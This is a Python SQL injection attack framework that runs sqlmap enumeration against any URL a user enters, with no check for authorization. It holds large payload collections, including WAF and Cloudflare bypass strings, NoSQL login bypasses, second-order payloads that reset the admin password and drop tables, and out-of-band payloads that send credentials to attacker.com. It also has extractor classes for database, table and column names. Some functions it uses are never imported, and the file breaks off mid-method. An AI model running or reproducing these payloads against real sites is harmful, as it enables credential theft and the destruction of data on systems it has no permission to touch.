#!/usr/bin/env python3

"""
WebAppSec v1.0 - Complete SQL Injection Testing Framework by Braintree
Advanced SQL injection testing with SQLMap integration and custom payloads
Compatible with Kali Linux and NetHunter Android

Author: Braintree Security Team
Version: 1.0
"""

import os
import sys
import time
import json
import subprocess
import requests
import threading
from datetime import datetime
import argparse
import random
import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket
from pathlib import Path
import base64

try:
    import colorama
    from colorama import Fore, Back, Style
    colorama.init()
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "colorama"], check=True)
    import colorama
    from colorama import Fore, Back, Style
    colorama.init()

try:
    import pyfiglet
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "pyfiglet"], check=True)
    import pyfiglet

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class SQLInjectionTester:
    """Advanced SQL injection testing engine"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.timeout = 15
        self.vulnerabilities = []
        self.output_dir = "output/sql_injection"
        
        # Create output directory
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
    
    def sqlmap_comprehensive_scan(self, targets):
        """Comprehensive SQL injection testing using SQLMap"""
        print(f"{Colors.YELLOW}[*] Starting comprehensive SQLMap SQL injection scan{Colors.END}")
        
        sqlmap_results = {}
        
        # Check if SQLMap is installed
        try:
            version_cmd = ['sqlmap', '--version']
            result = subprocess.run(version_cmd, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                version_info = result.stdout.strip()
                print(f"{Colors.GREEN}[+] SQLMap version: {version_info.split()[1]}{Colors.END}")
            else:
                print(f"{Colors.YELLOW}[!] SQLMap not found. Installing...{Colors.END}")
                install_cmd = ['sudo', 'apt', 'install', '-y', 'sqlmap']
                print(f"{Colors.PURPLE}[CMD] Executing: {' '.join(install_cmd)}{Colors.END}")
                subprocess.run(install_cmd, capture_output=True, timeout=300)
                print(f"{Colors.GREEN}[+] SQLMap installation completed{Colors.END}")
        
        except FileNotFoundError:
            print(f"{Colors.RED}[-] SQLMap installation failed{Colors.END}")
            return sqlmap_results
        
        for target in targets:
            try:
                print(f"\n{Colors.CYAN}[INFO] Testing {target} for SQL injection vulnerabilities...{Colors.END}")
                
                target_results = {
                    'url': target,
                    'vulnerabilities': [],
                    'databases': [],
                    'tables': [],
                    'columns': [],
                    'data_dumped': False
                }
                
                # Phase 1: Basic SQL injection detection
                print(f"{Colors.CYAN}[INFO] Phase 1 - SQL injection detection{Colors.END}")
                
                detection_cmd = [
                    'sqlmap',
                    '-u', target,
                    '--batch',
                    '--random-agent',
                    '--level', '3',
                    '--risk', '2',
                    '--timeout', '10',
                    '--retries', '2',
                    '--technique', 'BEUSTQ',
                    '--threads', '5'
                ]
                
                print(f"{Colors.PURPLE}[CMD] Executing: {' '.join(detection_cmd)}{Colors.END}")
                print(f"{Colors.CYAN}[INFO] Running SQL injection detection with multiple techniques...{Colors.END}")
                
                detection_result = subprocess.run(detection_cmd, capture_output=True, text=True, timeout=300)
                
                if detection_result.returncode == 0:
                    print(f"{Colors.GREEN}[SQLMAP DETECTION OUTPUT]:{Colors.END}")
                    
                    injection_found = False
                    for line in detection_result.stdout.split('\n'):
                        if any(keyword in line.lower() for keyword in ['vulnerable', 'injectable', 'parameter']):
                            print(f"  {Colors.RED}{line.strip()}{Colors.END}")
                            if 'vulnerable' in line.lower() or 'injectable' in line.lower():
                                injection_found = True
                                target_results['vulnerabilities'].append(line.strip())
                        elif any(keyword in line for keyword in ['[INFO]', '[WARNING]', '[CRITICAL]', '[ERROR]']):
                            if 'testing' in line.lower() or 'parameter' in line.lower():
                                print(f"  {Colors.WHITE}{line.strip()}{Colors.END}")
                    
                    if injection_found:
                        print(f"{Colors.GREEN}[+] SQL injection vulnerability confirmed!{Colors.END}")
                        
                        # Phase 2: Database enumeration
                        print(f"\n{Colors.CYAN}[INFO] Phase 2 - Database enumeration{Colors.END}")
                        
                        enum_cmd = [
                            'sqlmap',
                            '-u', target,
                            '--batch',
                            '--random-agent',
                            '--dbs',
                            '--threads', '3'
                        ]
                        
                        print(f"{Colors.PURPLE}[CMD] Executing: {' '.join(enum_cmd)}{Colors.END}")
                        print(f"{Colors.CYAN}[INFO] Enumerating available databases...{Colors.END}")
                        
                        enum_result = subprocess.run(enum_cmd, capture_output=True, text=True, timeout=180)
                        
                        if enum_result.returncode == 0:
                            print(f"{Colors.GREEN}[DATABASE ENUMERATION]:{Colors.END}")
                            
                            for line in enum_result.stdout.split('\n'):
                                if 'available databases' in line.lower():
                                    print(f"  {Colors.GREEN}{line.strip()}{Colors.END}")
                                elif line.strip().startswith('[*]') and any(db in line for db in ['information_schema', 'mysql', 'test']):
                                    db_name = line.strip()[3:].strip()
                                    target_results['databases'].append(db_name)
                                    print(f"  {Colors.CYAN}Database: {db_name}{Colors.END}")
                        
                        # Phase 3: Table enumeration for interesting databases
                        if target_results['databases']:
                            interesting_dbs = [db for db in target_results['databases'] if db not in ['information_schema', 'mysql', 'performance_schema']]
                            
                            if interesting_dbs:
                                print(f"\n{Colors.CYAN}[INFO] Phase 3 - Table enumeration{Colors.END}")
                                
                                for db in interesting_dbs[:2]:  # Limit to first 2 interesting databases
                                    table_cmd = [
                                        'sqlmap',
                                        '-u', target,
                                        '--batch',
                                        '--random-agent',
                                        '-D', db,
                                        '--tables',
                                        '--threads', '2'
                                    ]
                                    
                                    print(f"{Colors.PURPLE}[CMD] Executing: sqlmap -u {target} -D {db} --tables{Colors.END}")
                                    print(f"{Colors.CYAN}[INFO] Enumerating tables in database '{db}'...{Colors.END}")
                                    
                                    table_result = subprocess.run(table_cmd, capture_output=True, text=True, timeout=120)
                                    
                                    if table_result.returncode == 0:
                                        print(f"{Colors.GREEN}[TABLES IN {db.upper()}]:{Colors.END}")
                                        
                                        for line in table_result.stdout.split('\n'):
                                            if line.strip().startswith('[*]') and ('table' in line.lower() or any(keyword in line.lower() for keyword in ['user', 'admin', 'account', 'login'])):
                                                table_name = line.strip()[3:].strip()
                                                target_results['tables'].append(f"{db}.{table_name}")
                                                print(f"  {Colors.BLUE}Table: {table_name}{Colors.END}")
                        
                        # Phase 4: Current user and privileges
                        print(f"\n{Colors.CYAN}[INFO] Phase 4 - User and privilege enumeration{Colors.END}")
                        
                        priv_cmd = [
                            'sqlmap',
                            '-u', target,
                            '--batch',
                            '--random-agent',
                            '--current-user',
                            '--current-db',
                            '--privileges'
                        ]
                        
                        print(f"{Colors.PURPLE}[CMD] Executing: {' '.join(priv_cmd)}{Colors.END}")
                        print(f"{Colors.CYAN}[INFO] Checking current user and privileges...{Colors.END}")
                        
                        priv_result = subprocess.run(priv_cmd, capture_output=True, text=True, timeout=60)
                        
                        if priv_result.returncode == 0:
                            print(f"{Colors.GREEN}[USER & PRIVILEGES]:{Colors.END}")
                            
                            for line in priv_result.stdout.split('\n'):
                                if any(keyword in line.lower() for keyword in ['current user', 'current database', 'privilege']):
                                    print(f"  {Colors.WHITE}{line.strip()}{Colors.END}")
                        
                        sqlmap_results[target] = target_results
                        
                        print(f"\n{Colors.GREEN}[SQLMAP SUMMARY FOR {target}]:{Colors.END}")
                        print(f"  {Colors.RED}SQL Injection: CONFIRMED{Colors.END}")
                        print(f"  {Colors.BLUE}Databases: {len(target_results['databases'])}{Colors.END}")
                        print(f"  {Colors.PURPLE}Tables: {len(target_results['tables'])}{Colors.END}")
                        
                    else:
                        print(f"{Colors.YELLOW}[!] No SQL injection vulnerabilities found in {target}{Colors.END}")
                        sqlmap_results[target] = target_results
                else:
                    print(f"{Colors.RED}[-] SQLMap detection failed with exit code {detection_result.returncode}{Colors.END}")
                    if detection_result.stderr:
                        print(f"{Colors.RED}[ERROR] {detection_result.stderr.strip()[:200]}...{Colors.END}")
                
            except subprocess.TimeoutExpired:
                print(f"{Colors.RED}[-] SQLMap scan timeout for {target}{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}[-] SQLMap scan failed for {target}: {e}{Colors.END}")
        
        return sqlmap_results
    
    def test_error_based_injection(self, url, parameter):
        """Advanced error-based SQL injection testing"""
        vulnerabilities = []
        
        error_payloads = [
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND extractvalue(rand(),concat(0x3a,version()))--",
            "' AND updatexml(null,concat(0x0a,version()),null)--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0--",
            "' UNION SELECT 1,exp(~(SELECT * FROM (SELECT COUNT(*) FROM information_schema.tables)x))--"
        ]
        
        for payload in error_payloads:
            try:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[parameter] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                error_patterns = [
                    (r"you have an error in your sql syntax", "MySQL Syntax Error"),
                    (r"warning: mysql_", "MySQL Function Warning"),
                    (r"postgresql query failed", "PostgreSQL Query Error"),
                    (r"mssql query", "MSSQL Query Error"),
                    (r"sqlite_exception", "SQLite Exception"),
                    (r"oracle.*error", "Oracle Database Error")
                ]
                
                for pattern, error_type in error_patterns:
                    if re.search(pattern, response.text.lower()):
                        vuln = {
                            'type': f'Error-based SQL Injection ({error_type})',
                            'parameter': parameter,
                            'payload': payload,
                            'url': test_url,
                            'evidence': f"Error pattern detected: {error_type}",
                            'confidence': 'High'
                        }
                        vulnerabilities.append(vuln)
                        print(f"  {Colors.RED}[+] {error_type} detected{Colors.END}")
                        break
                
                time.sleep(0.5)
                
            except Exception as e:
                print(f"  {Colors.YELLOW}! Error testing payload: {e}{Colors.END}")
        
        return vulnerabilities
    
    def test_time_based_injection(self, url, parameter):
        """Advanced time-based blind SQL injection testing"""
        vulnerabilities = []
        
        # Database-specific time delay payloads
        time_payloads = {
            'mysql': ["' AND SLEEP(5)--", "' AND IF(1=1,SLEEP(5),0)--"],
            'postgresql': ["' AND pg_sleep(5)--"],
            'mssql': ["; WAITFOR DELAY '00:00:05'--"],
            'oracle': ["' AND dbms_pipe.receive_message('test',5) IS NULL--"]
        }
        
        for db_type, payloads in time_payloads.items():
            for payload in payloads:
                try:
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[parameter] = [payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                    
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=self.timeout)
                    end_time = time.time()
                    
                    response_time = end_time - start_time
                    
                    if response_time >= 4.5:
                        vuln = {
                            'type': f'Time-based Blind SQL Injection ({db_type.upper()})',
                            'parameter': parameter,
                            'payload': payload,
                            'url': test_url,
                            'evidence': f"Response delayed by {response_time:.2f} seconds",
                            'confidence': 'High',
                            'response_time': response_time
                        }
                        vulnerabilities.append(vuln)
                        print(f"{Colors.RED}[VULNERABLE] Time-based injection detected ({db_type.upper()}) - {response_time:.2f}s delay{Colors.END}")
                        return vulnerabilities
                    
                    time.sleep(1)
                    
                except Exception as e:
                    print(f"  {Colors.YELLOW}! Error testing {db_type} payload: {e}{Colors.END}")
        
        return vulnerabilities
    
    def comprehensive_scan(self, targets):
        """Main comprehensive scanning method that integrates all testing approaches"""
        print(f"{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}WebAppSec SQL INJECTION COMPREHENSIVE SCAN{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.END}")
        print(f"{Colors.WHITE}Targets: {len(targets)}{Colors.END}")
        print(f"{Colors.WHITE}Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}")
        print()
        
        all_results = {
            'targets_tested': 0,
            'vulnerabilities_found': 0,
            'detailed_results': {},
            'sqlmap_results': {},
            'start_time': datetime.now()
        }
        
        # Phase 1: SQLMap comprehensive testing
        print(f"{Colors.YELLOW}[PHASE 1] Starting SQLMap comprehensive testing...{Colors.END}")
        sqlmap_results = self.sqlmap_comprehensive_scan(targets)
        all_results['sqlmap_results'] = sqlmap_results
        
        # Phase 2: Custom payload testing
        print(f"\n{Colors.YELLOW}[PHASE 2] Starting custom payload testing...{Colors.END}")
        
        for target in targets:
            print(f"\n{Colors.CYAN}[INFO] Processing target: {target}{Colors.END}")
            all_results['targets_tested'] += 1
            
            target_vulns = []
            
            try:
                parsed_url = urlparse(target)
                params = parse_qs(parsed_url.query)
                
                if not params:
                    print(f"{Colors.YELLOW}[!] No parameters found in {target}{Colors.END}")
                    continue
                
                print(f"{Colors.GREEN}[+] Found parameters: {list(params.keys())}{Colors.END}")
                
                for param_name in params.keys():
                    print(f"\n{Colors.BLUE}[*] Testing parameter: {param_name}{Colors.END}")
                    
                    # Error-based testing
                    error_results = self.test_error_based_injection(target, param_name)
                    if error_results:
                        target_vulns.extend(error_results)
                    
                    # Time-based testing
                    time_results = self.test_time_based_injection(target, param_name)
                    if time_results:
                        target_vulns.extend(time_results)
                
                all_results['detailed_results'][target] = target_vulns
                all_results['vulnerabilities_found'] += len(target_vulns)
                
                if target_vulns:
                    print(f"\n{Colors.GREEN}[TARGET SUMMARY] {target}: {len(target_vulns)} vulnerabilities{Colors.END}")
                else:
                    print(f"\n{Colors.GREEN}[TARGET SUMMARY] {target}: No vulnerabilities detected{Colors.END}")
                    
            except Exception as e:
                print(f"{Colors.RED}[-] Error testing target {target}: {e}{Colors.END}")
        
        # Final summary
        all_results['end_time'] = datetime.now()
        duration = all_results['end_time'] - all_results['start_time']
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}{'='*80}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}COMPREHENSIVE SCAN COMPLETED{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}{'='*80}{Colors.END}")
        print(f"{Colors.WHITE}Scan Duration: {duration}{Colors.END}")
        print(f"{Colors.WHITE}Targets Tested: {all_results['targets_tested']}{Colors.END}")
        print(f"{Colors.RED}Total Vulnerabilities: {all_results['vulnerabilities_found']}{Colors.END}")
        
        return all_results
    
    def run(self):
        """Run the SQL injection framework (called from main WebAppSec menu)"""
        print(f"{Colors.CYAN}[*] Starting SQL Injection Framework...{Colors.END}")
        
        targets = []
        
        # Simple target input for integration with main framework
        target_input = input(f"{Colors.WHITE}Enter target URL(s) [comma-separated]: {Colors.END}").strip()
        
        if target_input:
            targets = [url.strip() for url in target_input.split(',') if url.strip()]
            
            # Ensure URLs have protocol
            targets = [url if url.startswith(('http://', 'https://')) else 'http://' + url for url in targets]
            
            print(f"{Colors.GREEN}[+] Testing {len(targets)} target(s)...{Colors.END}")
            
            # Run comprehensive scan
            results = self.comprehensive_scan(targets)
            
            # Display summary
            print(f"\n{Colors.BOLD}SCAN RESULTS SUMMARY:{Colors.END}")
            print(f"  Targets Tested: {results['targets_tested']}")
            print(f"  Total Vulnerabilities: {results['vulnerabilities_found']}")
            
            if results['vulnerabilities_found'] > 0:
                print(f"\n{Colors.RED}[CRITICAL] SQL injection vulnerabilities found!{Colors.END}")
                print(f"{Colors.YELLOW}[*] Review the detailed output above for exploitation guidance{Colors.END}")
            else:
                print(f"\n{Colors.GREEN}[+] No SQL injection vulnerabilities detected{Colors.END}")
        else:
            print(f"{Colors.RED}[-] No targets specified{Colors.END}")


class EnvironmentDetector:
    """Detect and configure environment-specific settings"""
    
    @staticmethod
    def detect_environment():
        """Detect if running on Android/NetHunter or Linux"""
        try:
            with open('/proc/version', 'r') as f:
                version_info = f.read().lower()
                if 'android' in version_info:
                    return {
                        'platform': 'android',
                        'is_nethunter': os.path.exists('/data/local/nhsystem'),
                        'is_termux': os.path.exists('/data/data/com.termux'),
                        'package_manager': 'pkg' if os.path.exists('/data/data/com.termux') else 'apt'
                    }
        except:
            pass
        
        return {
            'platform': 'linux',
            'is_nethunter': False,
            'is_termux': False,
            'package_manager': 'apt'
        }
    
    @staticmethod
    def install_dependencies():
        """Install required system dependencies"""
        env = EnvironmentDetector.detect_environment()
        
        dependencies = {
            'pkg': ['python', 'nmap', 'sqlmap', 'curl', 'wget'],
            'apt': ['python3', 'nmap', 'sqlmap', 'curl', 'wget', 'hydra']
        }
        
        package_manager = env['package_manager']
        
        print(f"{Colors.YELLOW}[*] Installing dependencies for {env['platform']}...{Colors.END}")
        
        try:
            if package_manager == 'pkg':
                subprocess.run(['pkg', 'update', '-y'], check=False)
                for dep in dependencies[package_manager]:
                    subprocess.run(['pkg', 'install', '-y', dep], check=False)
            else:
                subprocess.run(['sudo', 'apt', 'update'], check=False)
                for dep in dependencies[package_manager]:
                    subprocess.run(['sudo', 'apt', 'install', '-y', dep], check=False)
            
            print(f"{Colors.GREEN}[+] Dependencies installation completed{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[-] Error installing dependencies: {e}{Colors.END}")

class SQLPayloads:
    """Comprehensive SQL injection payload collection from Ultimate Guide 2025"""
    
    # Database detection payloads from the ultimate guide
    DB_DETECTION = {
        'mysql': [
            "' AND 5=5 AND 'MySQL'='MySQL",
            "' UNION SELECT @@version,@@datadir,USER(),DATABASE()-- ",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0-- ",
            "' AND LENGTH(database()) > 0-- ",
            "' UNION SELECT @@version_comment,@@version_compile_os,@@version_compile_machine,null--",
            "' UNION SELECT @@hostname,@@port,@@datadir,null--"
        ],
        'mssql': [
            "' AND 5=5 AND 'MSSQL'='MSSQL",
            "' UNION SELECT @@version,DB_NAME(),USER_NAME(),SYSTEM_USER-- ",
            "' AND (SELECT COUNT(*) FROM sysobjects) > 0-- ",
            "; WAITFOR DELAY '00:00:01'-- ",
            "' UNION SELECT name,database_id,create_date,null FROM sys.databases--",
            "' UNION SELECT SYSTEM_USER,HOST_NAME(),DB_NAME(),null--"
        ],
        'postgresql': [
            "' AND 5=5 AND 'PostgreSQL'='PostgreSQL",
            "' UNION SELECT version(),current_database(),current_user,session_user-- ",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0-- ",
            "' AND pg_sleep(1)-- ",
            "' UNION SELECT datname,datdba::regrole,encoding,null FROM pg_database--",
            "' UNION SELECT current_setting('data_directory'),null,null,null--"
        ],
        'oracle': [
            "' AND 5=5 AND 'Oracle'='Oracle",
            "' UNION SELECT banner,null,null,null FROM v$version-- ",
            "' AND (SELECT COUNT(*) FROM all_tables) > 0-- ",
            "' AND dbms_pipe.receive_message('test',1) IS NULL-- ",
            "' UNION SELECT username,account_status,created,null FROM dba_users--",
            "' UNION SELECT UTL_INADDR.get_host_name,null,null,null FROM dual--"
        ],
        'sqlite': [
            "' AND 5=5 AND 'SQLite'='SQLite",
            "' UNION SELECT sqlite_version(),null,null,null-- ",
            "' AND (SELECT COUNT(*) FROM sqlite_master) > 0-- ",
            "' UNION SELECT name,type,sql,null FROM sqlite_master--"
        ]
    }
    
    # Error-based payloads
    ERROR_BASED = [
        "' AND 1=CONVERT(int, (SELECT @@version))-- ",
        "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS int)-- ",
        "' AND extractvalue(rand(),concat(0x3a,version()))-- ",
        "' AND updatexml(null,concat(0x0a,version()),null)-- ",
        "' UNION SELECT 1,exp(~(SELECT * FROM (SELECT COUNT(*) FROM information_schema.tables)x))-- "
    ]
    
    # Boolean-based blind payloads
    BOOLEAN_BLIND = [
        "' AND 1=1-- ",
        "' AND 1=2-- ",
        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0-- ",
        "' AND (SELECT LENGTH(database())) > 5-- ",
        "' AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 64-- "
    ]
    
    # Time-based blind payloads
    TIME_BASED = {
        'mysql': [
            "' AND IF(1=1, SLEEP(5), 0)-- ",
            "' AND IF((SELECT COUNT(*) FROM information_schema.tables)>0, SLEEP(5), 0)-- ",
            "' UNION SELECT IF(1=1,SLEEP(5),0),null-- "
        ],
        'mssql': [
            "; WAITFOR DELAY '00:00:05'-- ",
            "; IF (1=1) WAITFOR DELAY '00:00:05'-- ",
            "; IF ((SELECT COUNT(*) FROM sysobjects)>0) WAITFOR DELAY '00:00:05'-- "
        ],
        'postgresql': [
            "' AND pg_sleep(5)-- ",
            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)-- ",
            "' UNION SELECT pg_sleep(5),null-- "
        ],
        'oracle': [
            "' AND dbms_pipe.receive_message('test',5) IS NULL-- ",
            "' AND (SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message('test',5) ELSE 0 END FROM dual) IS NULL-- "
        ]
    }
    
    # Union-based payloads
    UNION_BASED = [
        "' UNION SELECT 1,2,3,4,5-- ",
        "' UNION SELECT null,null,null,null,null-- ",
        "' UNION ALL SELECT 1,2,3,4,5-- ",
        "' UNION SELECT 1,database(),user(),version()-- ",
        "' UNION SELECT 1,table_name,column_name,null FROM information_schema.columns-- "
    ]
    
    # WAF bypass payloads from Ultimate Guide 2025
    WAF_BYPASS = {
        'case_variation': [
            "' uNiOn SeLeCt * fRoM users-- ",
            "' UnIoN/**/sElEcT * FrOm users-- ",
            "' UNION ALL SELECT * FROM users-- ",
            "' uNiOn aLl SeLeCt * fRoM users-- "
        ],
        'comment_insertion': [
            "'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users-- ",
            "'/*!50000UNION*//*!50000SELECT*/username,password/*!50000FROM*/users-- ",
            "'/*comment*/UNION/*comment*/SELECT/*comment*/username,password/*comment*/FROM/*comment*/users-- ",
            "' UNION/*bypass*/SELECT/*bypass*/1,2,3-- "
        ],
        'string_concatenation': [
            "' UNION SELECT CONCAT('adm','in'),password FROM users-- ",
            "' UNION SELECT CONCAT_WS('','adm','in'),password FROM users-- ",
            "' UNION SELECT 'adm'+'in',password FROM users-- ",
            "' UNION SELECT 'adm'||'in',password FROM users-- "
        ],
        'encoding_techniques': [
            "%27%20UNION%20SELECT%20*%20FROM%20users-- ",
            "%2527%2520UNION%2520SELECT%252A%2520FROM%2520users-- ",
            "' UNION SELECT 0x61646D696E,password FROM users-- ",
            "' UNION SELECT CHAR(97,100,109,105,110),password FROM users-- ",
            "' UNION SELECT UNHEX('61646D696E'),password FROM users-- "
        ],
        'alternative_syntax': [
            "' UNION SELECT username,password FROM users LIMIT 1-- ",
            "' UNION SELECT username,password FROM users# ",
            "' UNION SELECT username,password FROM users;%00 ",
            "' || (SELECT username FROM users WHERE id=1) ",
            "' AND 1 IN (SELECT username FROM users) "
        ],
        'function_based': [
            "' UNION SELECT MID(username,1,10),password FROM users-- ",
            "' UNION SELECT LEFT(username,10),password FROM users-- ",
            "' UNION SELECT RIGHT(username,10),password FROM users-- ",
            "' UNION SELECT IF(1=1,username,null),password FROM users-- ",
            "' UNION SELECT CASE WHEN 1=1 THEN username ELSE null END,password FROM users-- "
        ],
        'modsecurity_bypass': [
            "{\"username\":\"admin' UNION SELECT 1,2,3-- \",\"password\":\"test\"} ",
            "?id=1&id=' UNION SELECT 1,2,3-- ",
            "?id=1&id=2' UNION SELECT 1,2,3-- "
        ],
        'cloudflare_bypass': [
            "'/**/UNION%0BSELECT%0Cusername,password%0DFROM%0Ausers-- ",
            "' UNION SELECT 1e0,2e0,username FROM users-- ",
            "' UNION SELECT 1.0,2.0,username FROM users-- "
        ]
    }
    
    # NoSQL injection payloads from Ultimate Guide 2025
    NOSQL_PAYLOADS = {
        'mongodb': [
            "username[$ne]=null&password[$ne]=null ",
            "username[$regex]=^admin&password[$ne]=null ",
            "username=admin&password=test'; return true; var fake=' ",
            "username=admin&password=test'; if (db.users.count() > 0) { sleep(5000); } var fake=' ",
            "username[$where]=function(){return true}&password=anything ",
            "username[$exists]=true&password[$exists]=true ",
            "username[$in][]=admin&username[$in][]=administrator&password[$ne]=null "
        ],
        'couchdb': [
            "username=admin&password[\"$ne\"]=null ",
            "selector={\"username\":{\"$regex\":\"^admin\"}}",
            "selector={\"username\":{\"$gt\":null},\"password\":{\"$gt\":null}} "
        ]
    }
    
    # Second-order SQL injection payloads
    SECOND_ORDER = [
        "admin' UNION SELECT password FROM admin_users WHERE '1'='1 ",
        "test'; INSERT INTO logs VALUES ('injected'); SELECT '1 ",
        "user'; UPDATE users SET password='hacked' WHERE username='admin'; SELECT ' ",
        "data'; DROP TABLE IF EXISTS temp; CREATE TABLE temp AS SELECT * FROM users; SELECT ' "
    ]
    
    # Out-of-band SQL injection payloads
    OUT_OF_BAND = {
        'dns_exfiltration': [
            "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'-- ",
            "' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\\\share'))-- ",
            "' UNION SELECT LOAD_FILE(CONCAT('\\\\',HEX(password),'.attacker.com\\\\share')) FROM users WHERE id=1-- "
        ],
        'http_exfiltration': [
            "' UNION SELECT UTL_HTTP.request('http://attacker.com/exfil?data='||username||':'||password) FROM users-- ",
            "'; EXEC xp_cmdshell 'powershell -c \"$data=(SELECT username,password FROM users FOR JSON AUTO); Invoke-WebRequest -Uri http://attacker.com/exfil -Method POST -Body $data\"'-- "
        ]
    }

class DataExtractor:
    """Advanced data extraction capabilities"""
    
    def __init__(self, session, vulnerability):
        self.session = session
        self.vuln = vulnerability
        self.timeout = 30
        
    def extract_databases(self):
        """Extract database names"""
        print(f"{Colors.BLUE}[*] Extracting database names...{Colors.END}")
        
        payloads = [
            "' UNION SELECT schema_name,null,null,null FROM information_schema.schemata-- ",
            "' UNION SELECT datname,null,null,null FROM pg_database-- ",  # PostgreSQL
            "' UNION SELECT name,null,null,null FROM sys.databases-- ",   # MSSQL
        ]
        
        databases = []
        
        for payload in payloads:
            try:
                # Inject payload into vulnerable parameter
                parsed = urlparse(self.vuln['url'])
                params = parse_qs(parsed.query)
                params[self.vuln['parameter']] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Parse response for database names
                soup = BeautifulSoup(response.text, 'html.parser')
                text = soup.get_text()
                
                # Look for common database names
                db_patterns = [
                    r'\b[a-zA-Z_][a-zA-Z0-9_]*_db\b',
                    r'\b[a-zA-Z_][a-zA-Z0-9_]*database\b',
                    r'\binformation_schema\b',
                    r'\bmysql\b',
                    r'\bpostgres\b'
                ]
                
                for pattern in db_patterns:
                    matches = re.findall(pattern, text, re.IGNORECASE)
                    databases.extend(matches)
                
            except Exception as e:
                continue
        
        unique_databases = list(set(databases))
        
        if unique_databases:
            print(f"{Colors.GREEN}[+] Found databases: {unique_databases}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}[!] No databases extracted{Colors.END}")
        
        return unique_databases
    
    def extract_tables(self, database=None):
        """Extract table names"""
        print(f"{Colors.BLUE}[*] Extracting table names...{Colors.END}")
        
        if database:
            payloads = [
                f"' UNION SELECT table_name,null,null,null FROM information_schema.tables WHERE table_schema='{database}'-- ",
                f"' UNION SELECT tablename,null,null,null FROM pg_tables WHERE schemaname='{database}'-- ",
            ]
        else:
            payloads = [
                "' UNION SELECT table_name,null,null,null FROM information_schema.tables-- ",
                "' UNION SELECT tablename,null,null,null FROM pg_tables-- ",
                "' UNION SELECT name,null,null,null FROM sysobjects WHERE type='U'-- ",
            ]
        
        tables = []
        
        for payload in payloads:
            try:
                parsed = urlparse(self.vuln['url'])
                params = parse_qs(parsed.query)
                params[self.vuln['parameter']] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Extract table names from response
                soup = BeautifulSoup(response.text, 'html.parser')
                text = soup.get_text()
                
                # Common table name patterns
                table_patterns = [
                    r'\b(users?|accounts?|members?|customers?)\b',
                    r'\b(admin|administrator)s?\b',
                    r'\b(login|auth|session)s?\b',
                    r'\b[a-zA-Z_][a-zA-Z0-9_]*_table\b'
                ]
                
                for pattern in table_patterns:
                    matches = re.findall(pattern, text, re.IGNORECASE)
                    tables.extend(matches)
                
            except Exception as e:
                continue
        
        unique_tables = list(set(tables))
        
        if unique_tables:
            print(f"{Colors.GREEN}[+] Found tables: {unique_tables}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}[!] No tables extracted{Colors.END}")
        
        return unique_tables
    
    def extract_columns(self, table):
        """Extract column names for a table"""
        print(f"{Colors.BLUE}[*] Extracting columns from table: {table}{Colors.END}")
        
        payloads = [
            f"' UNION SELECT column_name,null,null,null FROM information_schema.columns WHERE table_name='{table}'-- ",
            f"' UNION SELECT column_name,null,null,null FROM information_schema.columns WHERE table_name='{table.upper()}'-- ",
        ]
        
        columns = []
        
        for payload in payloads:
            try:
                parsed = urlparse(self.vuln['url'])
                params = parse_qs(parsed.query)
                params[self.vuln['parameter']] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Extract column names
                soup = BeautifulSoup(response.text, 'html.parser')
                text = soup.get_text()
                
                # Common column patterns
                column_patterns = [
                    r'\b(username|user_name|login|email)\b',
                    r'\b(password|passwd|pwd|pass)\b',
                    r'\b(id|user_id|account_id)\b',
                    r'\b(name|full_name|first_name|last_name)\b'
                ]
                
                for pattern in column_patterns:
                    matches = re.findall(pattern, text, re.IGNORECASE)
                    columns.extend(matches)
                
            except Exception as e:
                continue
        
